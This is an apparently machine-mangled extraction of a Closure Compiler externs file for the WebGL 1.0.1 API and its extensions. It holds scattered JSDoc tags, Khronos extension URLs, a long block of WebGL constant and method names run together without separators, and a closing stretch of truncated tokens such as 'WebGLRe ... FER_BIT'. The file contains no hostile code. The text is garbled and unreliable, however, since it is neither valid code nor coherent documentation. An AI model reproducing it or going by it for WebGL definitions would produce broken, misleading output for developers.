 * @param {number} type
 * @param {boolean} normalized
 * @param {number} stride
 * @param {number} offset
 * @return {undefined}
 
 * @param {string} eventType
 * @constructor
 * @noalias
 * @extends {Event}
 
 * @constructor
 * @noalias
 * @extends {WebGLObject}
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_texture_float/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_texture_half_float/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/WEBGL_lose_context/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_standard_derivatives/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_vertex_array_object/
 * @constructor
 * @noalias
 * @extends {WebGLObject}
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_vertex_array_object/
 * @constructor
 * @noalias
 
 * @return {WebGLVertexArrayObjectOES}
 * @nosideeffects
 
 * @param {WebGLVertexArrayObjectOES} arrayObject
 * @return {undefined}
 
 * @param {WebGLVertexArrayObjectOES} arrayObject
 * @return {boolean}
 * @nosideeffects
 
 * @see http://www.khronos.org/registry/webgl/extensions/WEBGL_debug_renderer_info/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/WEBGL_debug_shaders/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/WEBGL_compressed_texture_s3tc/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_depth_texture/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_element_index_uint/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/EXT_texture_filter_anisotropic/
 * @constructor
 * @noalias
 
 * @see https://www.khronos.org/registry/webgl/extensions/WEBGL_draw_buffers/
 * @constructor
 * @noalias
 
 * @param {Array<number>} buffers Draw buffers.
 * @return {undefined}
 
 * @see http://www.khronos.org/registry/webgl/extensions/ANGLE_instanced_arrays/
 * @constructor
 * @noalias
 
 * @param {number} mode Primitive type.
 * @param {number} first First vertex.
 * @param {number} count Number of vertices per instance.
 * @param {number} primcount Number of instances.
 * @return {undefined}
 
 * @param {number} mode Primitive type.
 * @param {number} count Number of vertex indices per instance.
 * @param {number} type Type of a vertex index.
 * @param {number} offset Offset to the first vertex index.
 * @param {number} primcount Number of instances.
 * @return {undefined}
 
 * @param {number} index Attribute index.
 * @param {number} divisor Instance divisor.
 * @return {undefined}
 WebGLRenderingContextDEPTH_BUFFER_BITSTENCIL_BUFFER_BITCOLOR_BUFFER_BITPOINTSLINESLINE_LOOPLINE_STRIPTRIANGLESTRIANGLE_STRIPTRIANGLE_FANZEROONESRC_COLORONE_MINUS_SRC_COLORSRC_ALPHAONE_MINUS_SRC_ALPHADST_ALPHAONE_MINUS_DST_ALPHADST_COLORONE_MINUS_DST_COLORSRC_ALPHA_SATURATEFUNC_ADDBLEND_EQUATIONBLEND_EQUATION_RGBBLEND_EQUATION_ALPHAFUNC_SUBTRACTFUNC_REVERSE_SUBTRACTBLEND_DST_RGBBLEND_SRC_RGBBLEND_DST_ALPHABLEND_SRC_ALPHACONSTANT_COLORONE_MINUS_CONSTANT_COLORCONSTANT_ALPHAONE_MINUS_CONSTANT_ALPHABLEND_COLORARRAY_BUFFERELEMENT_ARRAY_BUFFERARRAY_BUFFER_BINDINGELEMENT_ARRAY_BUFFER_BINDINGSTREAM_DRAWSTATIC_DRAWDYNAMIC_DRAWBUFFER_SIZEBUFFER_USAGECURRENT_VERTEX_ATTRIBFRONTBACKFRONT_AND_BACKCULL_FACEBLENDDITHERSTENCIL_TESTDEPTH_TESTSCISSOR_TESTPOLYGON_OFFSET_FILLSAMPLE_ALPHA_TO_COVERAGESAMPLE_COVERAGENO_ERRORINVALID_ENUMINVALID_VALUEINVALID_OPERATIONOUT_OF_MEMORYCWCCWLINE_WIDTHALIASED_POINT_SIZE_RANGEALIASED_LINE_WIDTH_RANGECULL_FACE_MODEFRONT_FACEDEPTH_RANGEDEPTH_WRITEMASKDEPTH_CLEAR_VALUEDEPTH_FUNCSTENCIL_CLEAR_VALUESTENCIL_FUNCSTENCIL_FAILSTENCIL_PASS_DEPTH_FAILSTENCIL_PASS_DEPTH_PASSSTENCIL_REFSTENCIL_VALUE_MASKSTENCIL_WRITEMASKSTENCIL_BACK_FUNCSTENCIL_BACK_FAILSTENCIL_BACK_PASS_DEPTH_FAILSTENCIL_BACK_PASS_DEPTH_PASSSTENCIL_BACK_REFSTENCIL_BACK_VALUE_MASKSTENCIL_BACK_WRITEMASKVIEWPORTSCISSOR_BOXCOLOR_CLEAR_VALUECOLOR_WRITEMASKUNPACK_ALIGNMENTPACK_ALIGNMENTMAX_TEXTURE_SIZEMAX_VIEWPORT_DIMSSUBPIXEL_BITSRED_BITSGREEN_BITSBLUE_BITSALPHA_BITSDEPTH_BITSSTENCIL_BITSPOLYGON_OFFSET_UNITSPOLYGON_OFFSET_FACTORTEXTURE_BINDING_2DSAMPLE_BUFFERSSAMPLESSAMPLE_COVERAGE_VALUESAMPLE_COVERAGE_INVERTCOMPRESSED_TEXTURE_FORMATSDONT_CAREFASTESTNICESTGENERATE_MIPMAP_HINTBYTEUNSIGNED_BYTESHORTUNSIGNED_SHORTINTUNSIGNED_INTFLOATDEPTH_COMPONENTALPHARGBRGBALUMINANCELUMINANCE_ALPHAUNSIGNED_SHORT_4_4_4_4UNSIGNED_SHORT_5_5_5_1UNSIGNED_SHORT_5_6_5FRAGMENT_SHADERVERTEX_SHADERMAX_VERTEX_ATTRIBSMAX_VERTEX_UNIFORM_VECTORSMAX_VARYING_VECTORSMAX_COMBINED_TEXTURE_IMAGE_UNITSMAX_VERTEX_TEXTURE_IMAGE_UNITSMAX_TEXTURE_IMAGE_UNITSMAX_FRAGMENT_UNIFORM_VECTORSSHADER_TYPEDELETE_STATUSLINK_STATUSVALIDATE_STATUSATTACHED_SHADERSACTIVE_UNIFORMSACTIVE_ATTRIBUTESSHADING_LANGUAGE_VERSIONCURRENT_PROGRAMNEVERLESSEQUALLEQUALGREATERNOTEQUALGEQUALALWAYSKEEPREPLACEINCRDECRINVERTINCR_WRAPDECR_WRAPVENDORRENDERERVERSIONNEARESTLINEARNEAREST_MIPMAP_NEARESTLINEAR_MIPMAP_NEARESTNEAREST_MIPMAP_LINEARLINEAR_MIPMAP_LINEARTEXTURE_MAG_FILTERTEXTURE_MIN_FILTERTEXTURE_WRAP_STEXTURE_WRAP_TTEXTURE_2DTEXTURETEXTURE_CUBE_MAPTEXTURE_BINDING_CUBE_MAPTEXTURE_CUBE_MAP_POSITIVE_XTEXTURE_CUBE_MAP_NEGATIVE_XTEXTURE_CUBE_MAP_POSITIVE_YTEXTURE_CUBE_MAP_NEGATIVE_YTEXTURE_CUBE_MAP_POSITIVE_ZTEXTURE_CUBE_MAP_NEGATIVE_ZMAX_CUBE_MAP_TEXTURE_SIZETEXTURE0TEXTURE1TEXTURE2TEXTURE3TEXTURE4TEXTURE5TEXTURE6TEXTURE7TEXTURE8TEXTURE9TEXTURE10TEXTURE11TEXTURE12TEXTURE13TEXTURE14TEXTURE15TEXTURE16TEXTURE17TEXTURE18TEXTURE19TEXTURE20TEXTURE21TEXTURE22TEXTURE23TEXTURE24TEXTURE25TEXTURE26TEXTURE27TEXTURE28TEXTURE29TEXTURE30TEXTURE31ACTIVE_TEXTUREREPEATCLAMP_TO_EDGEMIRRORED_REPEATFLOAT_VEC2FLOAT_VEC3FLOAT_VEC4INT_VEC2INT_VEC3INT_VEC4BOOLBOOL_VEC2BOOL_VEC3BOOL_VEC4FLOAT_MAT2FLOAT_MAT3FLOAT_MAT4SAMPLER_2DSAMPLER_CUBEVERTEX_ATTRIB_ARRAY_ENABLEDVERTEX_ATTRIB_ARRAY_SIZEVERTEX_ATTRIB_ARRAY_STRIDEVERTEX_ATTRIB_ARRAY_TYPEVERTEX_ATTRIB_ARRAY_NORMALIZEDVERTEX_ATTRIB_ARRAY_POINTERVERTEX_ATTRIB_ARRAY_BUFFER_BINDINGIMPLEMENTATION_COLOR_READ_FORMATIMPLEMENTATION_COLOR_READ_TYPECOMPILE_STATUSLOW_FLOATMEDIUM_FLOATHIGH_FLOATLOW_INTMEDIUM_INTHIGH_INTFRAMEBUFFERRENDERBUFFERRGBA4RGB5_A1RGB565DEPTH_COMPONENT16STENCIL_INDEXSTENCIL_INDEX8DEPTH_STENCILRENDERBUFFER_WIDTHRENDERBUFFER_HEIGHTRENDERBUFFER_INTERNAL_FORMATRENDERBUFFER_RED_SIZERENDERBUFFER_GREEN_SIZERENDERBUFFER_BLUE_SIZERENDERBUFFER_ALPHA_SIZERENDERBUFFER_DEPTH_SIZERENDERBUFFER_STENCIL_SIZEFRAMEBUFFER_ATTACHMENT_OBJECT_TYPEFRAMEBUFFER_ATTACHMENT_OBJECT_NAMEFRAMEBUFFER_ATTACHMENT_TEXTURE_LEVELFRAMEBUFFER_ATTACHMENT_TEXTURE_CUBE_MAP_FACECOLOR_ATTACHMENT0DEPTH_ATTACHMENTSTENCIL_ATTACHMENTDEPTH_STENCIL_ATTACHMENTNONEFRAMEBUFFER_COMPLETEFRAMEBUFFER_INCOMPLETE_ATTACHMENTFRAMEBUFFER_INCOMPLETE_MISSING_ATTACHMENTFRAMEBUFFER_INCOMPLETE_DIMENSIONSFRAMEBUFFER_UNSUPPORTEDFRAMEBUFFER_BINDINGRENDERBUFFER_BINDINGMAX_RENDERBUFFER_SIZEINVALID_FRAMEBUFFER_OPERATIONUNPACK_FLIP_Y_WEBGLUNPACK_PREMULTIPLY_ALPHA_WEBGLCONTEXT_LOST_WEBGLUNPACK_COLORSPACE_CONVERSION_WEBGLBROWSER_DEFAULT_WEBGLdrawingBufferWidthdrawingBufferHeightgetContextAttributesisContextLostgetSupportedExtensionsgetExtensionactiveTexturetextureattachShaderprogramshaderbindAttribLocationbindBufferbindFramebufferbindRenderbufferbindTextureblendColorblendEquationblendEquationSeparatemodeRGBmodeAlphablendFuncsfactordfactorblendFuncSeparatesrcRGBdstRGBsrcAlphadstAlphabufferDatabufferSubDatacheckFramebufferStatusclearColorclearDepthclearStencilcolorMaskcompileShadercompressedTexImage2DinternalformatcompressedTexSubImage2DxoffsetyoffsetcopyTexImage2DcopyTexSubImage2DcreateBuffercreateFramebuffercreateProgramcreateRenderbuffercreateShadercreateTexturecullFacedeleteBufferdeleteFramebufferdeleteProgramdeleteRenderbufferdeleteShaderdeleteTexturedepthFuncdepthMaskdepthRangenearValfarValdetachShaderdisableVertexAttribArraydrawArraysdrawElementscapenableVertexAttribArrayfinishframebufferRenderbufferattachmentrenderbuffertargetrenderbufferframebufferTexture2DtextargetfrontFacegenerateMipmapgetActiveAttribgetActiveUniformgetAttachedShadersgetAttribLocationgetBufferParameterpnamegetErrorgetFramebufferAttachmentParametergetProgramParametergetProgramInfoLoggetRenderbufferParametergetShaderParametergetShaderPrecisionFormatshadertypeprecisiontypegetShaderInfoLoggetShaderSourcegetTexParametergetUniformgetUniformLocationgetVertexAttribgetVertexAttribOffsethintisEnabledisFramebufferframebufferisProgramisRenderbufferisShaderisTexturelinkProgrampixelStoreipolygonOffsetfactorunitsreadPixelspixelsrenderbufferStoragesampleCoveragecoveragescissorshaderSourcestencilFuncstencilFuncSeparatestencilMaskstencilMaskSeparatestencilOpzfailzpassstencilOpSeparatetexImage2Dopt_pixelstexParameterftexParameteritexSubImage2Duniform1funiform1fvuniform1iuniform1ivuniform2funiform2fvuniform2iuniform2ivuniform3fvalue3uniform3fvuniform3iuniform3ivuniform4fvalue4uniform4fvuniform4iuniform4ivuniformMatrix2fvtransposeuniformMatrix3fvuniformMatrix4fvuseProgramvalidateProgramvertexAttrib1findxvertexAttrib1fvvertexAttrib2fvertexAttrib2fvvertexAttrib3fvertexAttrib3fvvertexAttrib4fvertexAttrib4fvvertexAttribPointernormalizedstrideviewportWebGLContextAttributesstencilantialiaspremultipliedAlphapreserveDrawingBufferpreferLowPowerToHighPerformancefailIfMajorPerformanceCaveatWebGLContextEventWebGLShaderPrecisionFormatrangeMinrangeMaxprecisionWebGLObjectWebGLBufferWebGLFramebufferWebGLProgramWebGLRenderbufferWebGLShaderWebGLTextureWebGLActiveInfoWebGLUniformLocationOES_texture_floatOES_texture_half_floatHALF_FLOAT_OESWEBGL_lose_contextloseContextrestoreContextOES_standard_derivativesFRAGMENT_SHADER_DERIVATIVE_HINT_OESWebGLVertexArrayObjectOESOES_vertex_array_objectVERTEX_ARRAY_BINDING_OEScreateVertexArrayOESdeleteVertexArrayOESarrayObjectisVertexArrayOESbindVertexArrayOESWEBGL_debug_renderer_infoUNMASKED_VENDOR_WEBGLUNMASKED_RENDERER_WEBGLWEBGL_debug_shadersgetTranslatedShaderSourceWEBGL_compressed_texture_s3tcCOMPRESSED_RGB_S3TC_DXT1_EXTCOMPRESSED_RGBA_S3TC_DXT1_EXTCOMPRESSED_RGBA_S3TC_DXT3_EXTCOMPRESSED_RGBA_S3TC_DXT5_EXTOES_depth_textureOES_element_index_uintEXT_texture_filter_anisotropicTEXTURE_MAX_ANISOTROPY_EXTMAX_TEXTURE_MAX_ANISOTROPY_EXTWEBGL_draw_buffersCOLOR_ATTACHMENT0_WEBGLCOLOR_ATTACHMENT1_WEBGLCOLOR_ATTACHMENT2_WEBGLCOLOR_ATTACHMENT3_WEBGLCOLOR_ATTACHMENT4_WEBGLCOLOR_ATTACHMENT5_WEBGLCOLOR_ATTACHMENT6_WEBGLCOLOR_ATTACHMENT7_WEBGLCOLOR_ATTACHMENT8_WEBGLCOLOR_ATTACHMENT9_WEBGLCOLOR_ATTACHMENT10_WEBGLCOLOR_ATTACHMENT11_WEBGLCOLOR_ATTACHMENT12_WEBGLCOLOR_ATTACHMENT13_WEBGLCOLOR_ATTACHMENT14_WEBGLCOLOR_ATTACHMENT15_WEBGLDRAW_BUFFER0_WEBGLDRAW_BUFFER1_WEBGLDRAW_BUFFER2_WEBGLDRAW_BUFFER3_WEBGLDRAW_BUFFER4_WEBGLDRAW_BUFFER5_WEBGLDRAW_BUFFER6_WEBGLDRAW_BUFFER7_WEBGLDRAW_BUFFER8_WEBGLDRAW_BUFFER9_WEBGLDRAW_BUFFER10_WEBGLDRAW_BUFFER11_WEBGLDRAW_BUFFER12_WEBGLDRAW_BUFFER13_WEBGLDRAW_BUFFER14_WEBGLDRAW_BUFFER15_WEBGLMAX_COLOR_ATTACHMENTS_WEBGLMAX_DRAW_BUFFERS_WEBGLdrawBuffersWEBGLbuffersANGLE_instanced_arraysVERTEX_ATTRIB_ARRAY_DIVISOR_ANGLEdrawArraysInstancedANGLEprimcountdrawElementsInstancedANGLEvertexAttribDivisorANGLEdivisorDefinitions for WebGL functions as described at
http://www.khronos.org/registry/webgl/specs/latest/
* This file is current up to the WebGL 1.0.1 spec, including extensions.
* This relies on html5.js being included for Canvas and Typed Array support.
* This includes some extensions defined at
http://www.khronos.org/registry/webgl/extensions/
*!WebGLContextAttributesNote that this has side effects by enabling the extension even if the
result is not used.(ArrayBufferView|ArrayBuffer|number)(ArrayBufferView|ArrayBuffer)!WebGLBuffer!WebGLFramebuffer!WebGLProgram!WebGLRenderbuffer!WebGLShader!WebGLTexture!Array.<WebGLShader>Array.<WebGLShader>or width
or height
or border
(ImageData|HTMLImageElement|HTMLCanvasElement|HTMLVideoElement|number)ArrayBufferView=or format
(Float32Array|Array.<number>)(number|boolean)(Int32Array|Array.<number>|Array.<boolean>)http://www.khronos.org/registry/webgl/extensions/OES_texture_float/
http://www.khronos.org/registry/webgl/extensions/OES_texture_half_float/
http://www.khronos.org/registry/webgl/extensions/WEBGL_lose_context/
http://www.khronos.org/registry/webgl/extensions/OES_standard_derivatives/
http://www.khronos.org/registry/webgl/extensions/OES_vertex_array_object/
http://www.khronos.org/registry/webgl/extensions/WEBGL_debug_renderer_info/
http://www.khronos.org/registry/webgl/extensions/WEBGL_debug_shaders/
http://www.khronos.org/registry/webgl/extensions/WEBGL_compressed_texture_s3tc/
http://www.khronos.org/registry/webgl/extensions/OES_depth_texture/
http://www.khronos.org/registry/webgl/extensions/OES_element_index_uint/
http://www.khronos.org/registry/webgl/extensions/EXT_texture_filter_anisotropic/
https://www.khronos.org/registry/webgl/extensions/WEBGL_draw_buffers/
Draw buffers.
http://www.khronos.org/registry/webgl/extensions/ANGLE_instanced_arrays/
Primitive type.
First vertex.
Number of vertices per instance.
Number of instances.
Number of vertex indices per instance.
Type of a vertex index.
Offset to the first vertex index.
Attribute index.
Instance divisor.
functio ... xt() {}WebGLRe ... ContextWebGLRe ... ER_BIT;WebGLRe ... FER_BITWebGLRe ... POINTS;WebGLRe ... .POINTSWebGLRe ... .LINES;WebGLRe ... t.LINESWebGLRe ... E_LOOP;WebGLRe ... NE_LOOPWebGLRe ... _STRIP;WebGLRe ... E_STRIPWebGLRe ... ANGLES;WebGLRe ... IANGLESWebGLRe ... LE_FAN;WebGLRe ... GLE_FANWebGLRe ... t.ZERO;WebGLRe ... xt.ZEROWebGLRe ... xt.ONE;WebGLRe ... ext.ONEWebGLRe ... _COLOR;WebGLRe ... C_COLORWebGLRe ... _ALPHA;WebGLRe ... C_ALPHAWebGLRe ... T_ALPHAWebGLRe ... T_COLORWebGLRe ... TURATE;WebGLRe ... ATURATEWebGLRe ... NC_ADD;WebGLRe ... UNC_ADDWebGLRe ... UATION;WebGLRe ... QUATIONWebGLRe ... ON_RGB;WebGLRe ... ION_RGBWebGLRe ... N_ALPHAWebGLRe ... BTRACT;WebGLRe ... UBTRACTFUNC_RE ... UBTRACTWebGLRe ... ST_RGB;WebGLRe ... DST_RGBWebGLRe ... RC_RGB;WebGLRe ... SRC_RGBONE_MIN ... T_COLORONE_MIN ... T_ALPHAWebGLRe ... D_COLORWebGLRe ... BUFFER;WebGLRe ... _BUFFERWebGLRe ... INDING;WebGLRe ... BINDINGELEMENT ... BINDINGWebGLRe ... M_DRAW;WebGLRe ... AM_DRAWWebGLRe ... C_DRAW;WebGLRe ... IC_DRAWWebGLRe ... R_SIZE;WebGLRe ... ER_SIZEWebGLRe ... _USAGE;WebGLRe ... R_USAGEWebGLRe ... ATTRIB;WebGLRe ... _ATTRIBCURRENT ... _ATTRIBWebGLRe ... .FRONT;WebGLRe ... t.FRONTWebGLRe ... t.BACK;WebGLRe ... xt.BACKWebGLRe ... D_BACK;WebGLRe ... ND_BACKWebGLRe ... L_FACE;WebGLRe ... LL_FACEWebGLRe ... .BLEND;WebGLRe ... t.BLENDWebGLRe ... DITHER;WebGLRe ... .DITHERWebGLRe ... L_TEST;WebGLRe ... IL_TESTWebGLRe ... H_TEST;WebGLRe ... TH_TESTWebGLRe ... R_TEST;WebGLRe ... OR_TESTWebGLRe ... T_FILL;WebGLRe ... ET_FILLWebGLRe ... VERAGE;WebGLRe ... OVERAGESAMPLE_ ... OVERAGEWebGLRe ... _ERROR;WebGLRe ... O_ERRORWebGLRe ... D_ENUM;WebGLRe ... ID_ENUMWebGLRe ... _VALUE;WebGLRe ... D_VALUEWebGLRe ... RATION;WebGLRe ... ERATIONWebGLRe ... MEMORY;WebGLRe ... _MEMORYWebGLRe ... ext.CW;WebGLRe ... text.CWWebGLRe ... xt.CCW;WebGLRe ... ext.CCWWebGLRe ... _WIDTH;WebGLRe ... E_WIDTHWebGLRe ... _RANGE;WebGLRe ... E_RANGEALIASED ... E_RANGEWebGLRe ... H_RANGEALIASED ... H_RANGEWebGLRe ... E_MODE;WebGLRe ... CE_MODEWebGLRe ... T_FACE;WebGLRe ... NT_FACEWebGLRe ... TEMASK;WebGLRe ... ITEMASKWebGLRe ... R_VALUEWebGLRe ... H_FUNC;WebGLRe ... TH_FUNCWebGLRe ... L_FUNC;WebGLRe ... IL_FUNCWebGLRe ... L_FAIL;WebGLRe ... IL_FAILWebGLRe ... H_FAIL;WebGLRe ... TH_FAILSTENCIL ... TH_FAILWebGLRe ... H_PASS;WebGLRe ... TH_PASSSTENCIL ... TH_PASSWebGLRe ... IL_REF;WebGLRe ... CIL_REFWebGLRe ... E_MASK;WebGLRe ... UE_MASKWebGLRe ... K_FUNC;WebGLRe ... CK_FUNCWebGLRe ... K_FAIL;WebGLRe ... CK_FAILWebGLRe ... CK_REF;WebGLRe ... ACK_REFSTENCIL ... UE_MASKSTENCIL ... ITEMASKWebGLRe ... EWPORT;WebGLRe ... IEWPORTWebGLRe ... OR_BOX;WebGLRe ... SOR_BOXWebGLRe ... GNMENT;WebGLRe ... IGNMENTWebGLRe ... E_SIZE;WebGLRe ... RE_SIZEWebGLRe ... T_DIMS;WebGLRe ... RT_DIMSWebGLRe ... L_BITS;WebGLRe ... EL_BITSWebGLRe ... D_BITS;WebGLRe ... ED_BITSWebGLRe ... N_BITS;WebGLRe ... EN_BITSWebGLRe ... E_BITS;WebGLRe ... UE_BITSWebGLRe ... A_BITS;WebGLRe ... HA_BITSWebGLRe ... H_BITS;WebGLRe ... TH_BITSWebGLRe ... IL_BITSWebGLRe ... _UNITS;WebGLRe ... T_UNITSWebGLRe ... FACTOR;WebGLRe ... _FACTORPOLYGON ... _FACTORWebGLRe ... ING_2D;WebGLRe ... DING_2DWebGLRe ... UFFERS;WebGLRe ... BUFFERSWebGLRe ... AMPLES;WebGLRe ... SAMPLESWebGLRe ... E_VALUESAMPLE_ ... E_VALUEWebGLRe ... INVERT;WebGLRe ... _INVERTSAMPLE_ ... _INVERTWebGLRe ... ORMATS;WebGLRe ... FORMATSCOMPRES ... FORMATSWebGLRe ... T_CARE;WebGLRe ... NT_CAREWebGLRe ... ASTEST;WebGLRe ... FASTESTWebGLRe ... NICEST;WebGLRe ... .NICESTWebGLRe ... P_HINT;WebGLRe ... AP_HINTWebGLRe ... t.BYTE;WebGLRe ... xt.BYTEWebGLRe ... D_BYTE;WebGLRe ... ED_BYTEWebGLRe ... .SHORT;WebGLRe ... t.SHORTWebGLRe ... _SHORT;WebGLRe ... D_SHORTWebGLRe ... xt.INT;WebGLRe ... ext.INTWebGLRe ... ED_INT;WebGLRe ... NED_INTWebGLRe ... .FLOAT;WebGLRe ... t.FLOATWebGLRe ... PONENT;WebGLRe ... MPONENTWebGLRe ... .ALPHA;WebGLRe ... t.ALPHAWebGLRe ... xt.RGB;WebGLRe ... ext.RGBWebGLRe ... t.RGBA;WebGLRe ... xt.RGBAWebGLRe ... INANCE;WebGLRe ... MINANCEWebGLRe ... E_ALPHAWebGLRe ... _4_4_4;WebGLRe ... 4_4_4_4UNSIGNE ... 4_4_4_4WebGLRe ... _5_5_1;WebGLRe ... 5_5_5_1UNSIGNE ... 5_5_5_1WebGLRe ... _5_6_5;WebGLRe ... T_5_6_5WebGLRe ... SHADER;WebGLRe ... _SHADERWebGLRe ... TTRIBS;WebGLRe ... ATTRIBSWebGLRe ... ECTORS;WebGLRe ... VECTORSMAX_VER ... VECTORSWebGLRe ... E_UNITSMAX_COM ... E_UNITSMAX_VER ... E_UNITSMAX_TEX ... E_UNITSMAX_FRA ... VECTORSWebGLRe ... R_TYPE;WebGLRe ... ER_TYPEWebGLRe ... STATUS;WebGLRe ... _STATUSWebGLRe ... HADERS;WebGLRe ... SHADERSWebGLRe ... IFORMS;WebGLRe ... NIFORMSWebGLRe ... IBUTES;WebGLRe ... RIBUTESWebGLRe ... ERSION;WebGLRe ... VERSIONSHADING ... VERSIONWebGLRe ... ROGRAM;WebGLRe ... PROGRAMWebGLRe ... .NEVER;WebGLRe ... t.NEVERWebGLRe ... t.LESS;WebGLRe ... xt.LESSWebGLRe ... .EQUAL;WebGLRe ... t.EQUALWebGLRe ... LEQUAL;WebGLRe ... .LEQUALWebGLRe ... REATER;WebGLRe ... GREATERWebGLRe ... TEQUAL;WebGLRe ... OTEQUALWebGLRe ... GEQUAL;WebGLRe ... .GEQUALWebGLRe ... ALWAYS;WebGLRe ... .ALWAYSWebGLRe ... t.KEEP;WebGLRe ... xt.KEEPWebGLRe ... EPLACE;WebGLRe ... REPLACEWebGLRe ... t.INCR;WebGLRe ... xt.INCRWebGLRe ... t.DECR;WebGLRe ... xt.DECRWebGLRe ... .INVERTWebGLRe ... R_WRAP;WebGLRe ... CR_WRAPWebGLRe ... VENDOR;WebGLRe ... .VENDORWebGLRe ... NDERER;WebGLRe ... ENDERERWebGLRe ... EAREST;WebGLRe ... NEARESTWebGLRe ... LINEAR;WebGLRe ... .LINEARNEAREST ... NEARESTLINEAR_ ... NEARESTWebGLRe ... _LINEARNEAREST ... _LINEARWebGLRe ... FILTER;WebGLRe ... _FILTERWebGLRe ... WRAP_S;WebGLRe ... _WRAP_SWebGLRe ... WRAP_T;WebGLRe ... _WRAP_TWebGLRe ... URE_2D;WebGLRe ... TURE_2DWebGLRe ... EXTURE;WebGLRe ... TEXTUREWebGLRe ... BE_MAP;WebGLRe ... UBE_MAPTEXTURE ... UBE_MAPWebGLRe ... TIVE_X;WebGLRe ... ITIVE_XTEXTURE ... ITIVE_XWebGLRe ... ATIVE_XTEXTURE ... ATIVE_XWebGLRe ... TIVE_Y;WebGLRe ... ITIVE_YTEXTURE ... ITIVE_YWebGLRe ... ATIVE_YTEXTURE ... ATIVE_YWebGLRe ... TIVE_Z;WebGLRe ... ITIVE_ZTEXTURE ... ITIVE_ZWebGLRe ... ATIVE_ZTEXTURE ... ATIVE_ZMAX_CUB ... RE_SIZEWebGLRe ... XTURE0;WebGLRe ... EXTURE0WebGLRe ... XTURE1;WebGLRe ... EXTURE1WebGLRe ... XTURE2;WebGLRe ... EXTURE2WebGLRe ... XTURE3;WebGLRe ... EXTURE3WebGLRe ... XTURE4;WebGLRe ... EXTURE4WebGLRe ... XTURE5;WebGLRe ... EXTURE5WebGLRe ... XTURE6;WebGLRe ... EXTURE6WebGLRe ... XTURE7;WebGLRe ... EXTURE7WebGLRe ... XTURE8;WebGLRe ... EXTURE8WebGLRe ... XTURE9;WebGLRe ... EXTURE9WebGLRe ... TURE10;WebGLRe ... XTURE10WebGLRe ... TURE11;WebGLRe ... XTURE11WebGLRe ... TURE12;WebGLRe ... XTURE12WebGLRe ... TURE13;WebGLRe ... XTURE13WebGLRe ... TURE14;WebGLRe ... XTURE14WebGLRe ... TURE15;WebGLRe ... XTURE15WebGLRe ... TURE16;WebGLRe ... XTURE16WebGLRe ... TURE17;WebGLRe ... XTURE17WebGLRe ... TURE18;WebGLRe ... XTURE18WebGLRe ... TURE19;WebGLRe ... XTURE19WebGLRe ... TURE20;WebGLRe ... XTURE20WebGLRe ... TURE21;WebGLRe ... XTURE21WebGLRe ... TURE22;WebGLRe ... XTURE22WebGLRe ... TURE23;WebGLRe ... XTURE23WebGLRe ... TURE24;WebGLRe ... XTURE24WebGLRe ... TURE25;WebGLRe ... XTURE25WebGLRe ... TURE26;WebGLRe ... XTURE26WebGLRe ... TURE27;WebGLRe ... XTURE27WebGLRe ... TURE28;WebGLRe ... XTURE28WebGLRe ... TURE29;WebGLRe ... XTURE29WebGLRe ... TURE30;WebGLRe ... XTURE30WebGLRe ... TURE31;WebGLRe ... XTURE31WebGLRe ... REPEAT;WebGLRe ... .REPEATWebGLRe ... O_EDGE;WebGLRe ... TO_EDGEWebGLRe ... _REPEATWebGLRe ... T_VEC2;WebGLRe ... AT_VEC2WebGLRe ... T_VEC3;WebGLRe ... AT_VEC3WebGLRe ... T_VEC4;WebGLRe ... AT_VEC4WebGLRe ... NT_VEC2WebGLRe ... NT_VEC3WebGLRe ... NT_VEC4WebGLRe ... t.BOOL;WebGLRe ... xt.BOOLWebGLRe ... L_VEC2;WebGLRe ... OL_VEC2WebGLRe ... L_VEC3;WebGLRe ... OL_VEC3WebGLRe ... L_VEC4;WebGLRe ... OL_VEC4WebGLRe ... T_MAT2;WebGLRe ... AT_MAT2WebGLRe ... T_MAT3;WebGLRe ... AT_MAT3WebGLRe ... T_MAT4;WebGLRe ... AT_MAT4WebGLRe ... LER_2D;WebGLRe ... PLER_2DWebGLRe ... R_CUBE;WebGLRe ... ER_CUBEWebGLRe ... NABLED;WebGLRe ... ENABLEDVERTEX_ ... ENABLEDWebGLRe ... Y_SIZE;WebGLRe ... AY_SIZEVERTEX_ ... AY_SIZEWebGLRe ... STRIDE;WebGLRe ... _STRIDEVERTEX_ ... _STRIDEWebGLRe ... Y_TYPE;WebGLRe ... AY_TYPEVERTEX_ ... AY_TYPEWebGLRe ... ALIZED;WebGLRe ... MALIZEDVERTEX_ ... MALIZEDWebGLRe ... OINTER;WebGLRe ... POINTERVERTEX_ ... POINTERVERTEX_ ... BINDINGWebGLRe ... FORMAT;WebGLRe ... _FORMATIMPLEME ... _FORMATWebGLRe ... D_TYPE;WebGLRe ... AD_TYPEIMPLEME ... AD_TYPEWebGLRe ... _FLOAT;WebGLRe ... W_FLOATWebGLRe ... M_FLOATWebGLRe ... H_FLOATWebGLRe ... OW_INT;WebGLRe ... LOW_INTWebGLRe ... UM_INT;WebGLRe ... IUM_INTWebGLRe ... GH_INT;WebGLRe ... IGH_INTWebGLRe ... EBUFFERWebGLRe ... RBUFFERWebGLRe ... .RGBA4;WebGLRe ... t.RGBA4WebGLRe ... GB5_A1;WebGLRe ... RGB5_A1WebGLRe ... RGB565;WebGLRe ... .RGB565WebGLRe ... NENT16;WebGLRe ... ONENT16WebGLRe ... _INDEX;WebGLRe ... L_INDEXWebGLRe ... INDEX8;WebGLRe ... _INDEX8WebGLRe ... TENCIL;WebGLRe ... STENCILWebGLRe ... R_WIDTHWebGLRe ... HEIGHT;WebGLRe ... _HEIGHTRENDERB ... _FORMATWebGLRe ... D_SIZE;WebGLRe ... ED_SIZERENDERB ... ED_SIZEWebGLRe ... N_SIZE;WebGLRe ... EN_SIZERENDERB ... EN_SIZEWebGLRe ... 